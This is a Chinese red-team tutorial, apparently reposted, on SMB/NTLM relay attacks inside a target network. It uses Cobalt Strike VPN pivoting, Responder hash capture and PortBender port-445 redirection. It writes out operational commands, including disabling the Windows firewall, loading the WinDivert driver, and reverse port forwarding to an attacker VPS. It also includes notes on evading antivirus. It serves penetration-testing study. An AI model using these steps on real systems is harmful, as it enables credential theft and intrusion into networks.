---
title: 实战下的内网中继攻击问题
url: https://buaq.net/go-161516.html
source: unSafe.sh - 不安全
date: 2023-05-04
fetch_date: 2025-10-04T11:38:39.492677
---

# 实战下的内网中继攻击问题

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/81b64026c85ed54ff0d3bfb92ef1e548.jpg)

实战下的内网中继攻击问题

在攻击内网的时候，有些攻击方式和漏洞比较特殊，必须要在对面网络环境下才能成功利用，比如SMB中继攻击，这篇文章利用CS自带的VPN和端口转发，以及一些插件来解决可能遇
*2023-5-3 20:26:0
Author: [xz.aliyun.com(查看原文)](/jump-161516.htm)
阅读量:80
收藏*

---

在攻击内网的时候，有些攻击方式和漏洞比较特殊，必须要在对面网络环境下才能成功利用，比如SMB中继攻击，这篇文章利用CS自带的VPN和端口转发，以及一些插件来解决可能遇到的问题。

## 利用CS自带的VPN加入对面内网

cobalt strike本身的beacon自带了vpn功能，可以简单配置就让我们的vps上的网络环境处于对方内网，非常方便。

### 基本原理

对于攻击者，目标的网络可通过虚拟网卡访问，此接口的工作方式类似于物理网络接口。当某个程序试图与目标网络交互时，会写入数据到虚拟网卡，在缓冲区中，VPN 服务器使用这些以太帧（二层网络的工作原理，参考wiki），通过数据通道（TCP/UDP/HTTP等等管道）将它们传输到 VPN 客户端。VPN 客户端接收这些流量并将它们转储到目标网络上。

下图即是基本数据交互过程：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201514-28fbc3ce-e9ac-1.png)

对于目标服务器而言，Cobalt Strike 的 VPN 客户端嗅探目标网络上的流量。当它看到我们需要的帧时，它会将它们中继到 VPN 服务器，将它们写入 TAP 接口。这会导致服务器的操作系统处理这些帧，就好像它们是从网络上读取的一样。可以简单理解为我们攻陷的机器有了两个ip地址，虚拟出来的ip通过vpn隧道来转发流量。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201616-4d7dad0c-e9ac-1.png)

因为实际利用过程采用的dll注入到内存，难以被杀毒查杀，实战适用范围还是挺广的。

### 实际操作

查看现在vps没有部署vpn前的网卡,目前只有两张网卡

```
ifconfig
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201630-55c621e2-e9ac-1.png)

在具备高权限的beacon下，选择piovting模块，找到deploy vpn这个选项

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201639-5b42d386-e9ac-1.png)

会弹出一个如下图的选项，记得勾选克隆MAC地址，之后点击add

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201645-5eadafa0-e9ac-1.png)

点击后出现了如下，注意到支持如下5中协议模拟vpn，根据情况选择你的协议，这里面根据官方文档的说法UDP是最快最合适的，与 TCP 和 HTTP 通道相比，UDP 通道的开销最少，不过如果您需要通过限制性防火墙，请使用 ICMP、HTTP 或 TCP（绑定）通道。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201702-69402538-e9ac-1.png)

测试过程中发现windows 10居然不支持？难道要windows servers?

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201718-72a19152-e9ac-1.png)

查看一下具体实现的技术是使用了TUN与TAP，理论上应该是全平台支持的，在windows上用的是WinPcap，可能CS4.7还没实现相关的功能吧。现在我换成windows server 2012就成功部署了，看样子应该是就支持windows server：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201728-784fd7e4-e9ac-1.png)

我们可以从网卡接口看到，我们的网络状态，如果你运气比较好，就可以看到tx和rx是直接有数据传输的，你可以直接回头看看vps上的网卡了：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201738-7eb8ecce-e9ac-1.png)

不过你大概率可能会和我一样，tx的数字是0，这意味着没有传输，只有接收，ifconfig压根还没看到phear0的网卡，其实网卡是还没启用，需要我们手工启动一下（这玩意太坑了，全网好像压根没有资料，官方文档也没有说明，耗了我前后两三天，处于玄学状态，有的时候就它就能自己把网卡拉起来，不过大多数时候得我们自己拉起来）

```
ip link set phear0 up
```

之后你就可以用ifconfig看到我们加入进来的网卡了：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201754-884317ec-e9ac-1.png)

查看你的ip地址，一般来说还没配上，你要手工自己配一下，ping一个没在用的ip，之后检查一下，看看能不能ping通对面的内网主机：

```
ifconfig phear0 192.168.31.11 netmask 255.255.255.0 up
```

或者，（你可能遇到SIOCSIFADDR: File exists报错，换一个ip就好了，然后看看你的ip有没有添加上网卡，原因暂时不清楚为什么）

```
ip addr add 192.168.31.11  dev phear0
```

成功ping通，延时和掉包都完美：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201810-9187b592-e9ac-1.png)

我们通过内网的一个机器扫描看看，看看能不能访问到我的vps上的服务,如下，我的确开了这几个（我服务器做了禁ping所以需要-Pn）：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201819-970365a2-e9ac-1.png)

现在我们再试一试responder这个投毒中继的神器

```
responder -I phear0
```

vps开启后我尝试直接从本机3389随便输入一个账号密码，来模拟中继的过程。vps上的responder成功抓到了我刚刚的NTLMv2-SSP Hash，实验结束。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503201844-a5a42510-e9ac-1.png)

## 利用反向端口转发和WinDivert强抓445流量

你肯定会想到端口转发的操作，没错，我之前也以为只要把445的流量转发出来就好了，不过实际没有这么简单，即使我们是system权限也是没有办法直接利用端口转发工具转发445，因为SMB在使用445端口时需要进行一些额外的协议处理，如SMB协议本身的封装、SMB会话的建立和维护，这里我们需要利用驱动注入的工具--PortBender来改变流量方向。需要注意的是，一旦注入了驱动之后，所有流量都会被改变，这会导致依靠此流量的业务会无法正常工作，即使你在之后取消了portbender的转发，依然有概率会让服务器的445端口异常。请保持冷静，最好一次成功，否则445端口服务一旦崩溃就只能重启来恢复了。

工具地址：<https://github.com/praetorian-inc/PortBender>

下载发布的在CS里面加载脚本即可，用法：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503202109-fc2b5d5e-e9ac-1.png)

使用之前要把我们驱动传到指定目录（必须要在这个目录下）：

```
cd C:\Windows\system32\drivers
upload /root/下载/WinDivert64.sys
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503202118-016dd152-e9ad-1.png)

记得把防火墙规则设置好，让流量通过，或者你和我一样比较懒，直接关掉

```
netsh advfirewall set allprofiles state off
```

我们先创建一条反向端口转发的规则，它把本机的8445流量全部抓发到了vps本机的445

```
rportfwd 8000 127.0.0.1 445
```

之后再利用PortBender来转发445的流量到8000

```
PortBender redirect 445 8000
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503202134-0b4f04d4-e9ad-1.png)

上面两条规则组合起来，使得在vps上监听445能抓到受害机器的445流量，值得注意的是必须要以system权限的beacon才能注入驱动，如果开始没有配置好，或者配置错误等原因会导致smb服务崩溃间接体现为445端口关闭状态。而且445经过转发后不能在中继自己，必须中继到其他服务器，这里我用了一个简单的域环境来体现。

```
dir \\192.168.31.153\admin$
```

在192.168.31.228用域管理员这里触发了445的认证

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503202152-15e45228-e9ad-1.png)

从CS的控制台可以看到我们接受到来自192.168.31.228的连接：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503202201-1b01731c-e9ad-1.png)

vps这里通过socks代理转发回流量，流量成功转发回去：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503202208-1f7164a2-e9ad-1.png)

我这里忘记把签名关了，导致没办法执行中间人攻击，不过这不是我们本章的重点。流量的走向图如下：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230503202216-2463e6ba-e9ad-1.png)

### 总结

在内网渗透中不可能给对面的windows装个python开启中继攻击，而且即使有python环境，大概率也会因为杀毒、smb本身的问题无法执行这类攻击，本文利用vpn和端口转发解决了这类问题。

参考资料：

<https://www.cobaltstrike.com/blog/how-vpn-pivoting-works-with-source-code/>

文章来源: https://xz.aliyun.com/t/12500
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)